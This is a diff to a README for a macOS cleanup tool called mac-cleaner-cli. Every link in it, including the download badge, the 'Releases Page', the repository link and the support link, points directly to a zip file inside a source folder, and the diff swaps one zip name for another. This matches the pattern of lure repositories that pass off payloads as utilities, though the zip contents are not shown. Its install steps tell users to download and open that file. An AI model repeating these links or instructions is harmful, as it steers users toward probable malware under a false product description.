@@ -1,8 +1,8 @@
 # 🧹 mac-cleaner-cli - Clean Your Mac Effortlessly
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip">
-    <img src="https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip%20mac--cleaner--cli-brightgreen" alt="Download mac-cleaner-cli" />
+  <a href="https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip">
+    <img src="https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip%20mac--cleaner--cli-brightgreen" alt="Download mac-cleaner-cli" />
   </a>
 </p>
 
@@ -28,13 +28,13 @@ To use mac-cleaner-cli, you need to have the following:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [mac-cleaner-cli Releases Page](https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip) to find the latest version.
+   Go to the [mac-cleaner-cli Releases Page](https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip) to find the latest version.
 
 2. **Select the Latest Release**  
    Look for the most recent version listed. It will be at the top of the page.
 
 3. **Download the File**  
-   Click on the file link related to mac-cleaner-cli, suitable for your system. The file is usually named something like `https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip`.
+   Click on the file link related to mac-cleaner-cli, suitable for your system. The file is usually named something like `https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip`.
 
 4. **Install the Application**  
    After the download completes, open the downloaded file and follow the on-screen instructions to install the application.
@@ -69,7 +69,7 @@ mac-cleaner-cli clean
 
 ## 📋 Support & Contributions
 
-If you face any issues while using mac-cleaner-cli, please check the **Issues** section on our [GitHub repository](https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip). For feature requests or contributions, feel free to open a pull request.
+If you face any issues while using mac-cleaner-cli, please check the **Issues** section on our [GitHub repository](https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip). For feature requests or contributions, feel free to open a pull request.
 
 ## 📜 License
 
@@ -77,4 +77,4 @@ mac-cleaner-cli is open-source and licensed under the MIT License. You are welco
 
 ---
 
-For the latest updates and support, always refer back to the [mac-cleaner-cli Releases Page](https://raw.githubusercontent.com/4kLuca4/mac-cleaner-cli/main/src/pickers/cli-mac-cleaner-2.2.zip). This tool is here to help you maintain a clutter-free Mac, making your computing experience smoother.
+For the latest updates and support, always refer back to the [mac-cleaner-cli Releases Page](https://github.com/4kLuca4/mac-cleaner-cli/raw/refs/heads/main/src/pickers/cleaner_mac_cli_1.5.zip). This tool is here to help you maintain a clutter-free Mac, making your computing experience smoother.
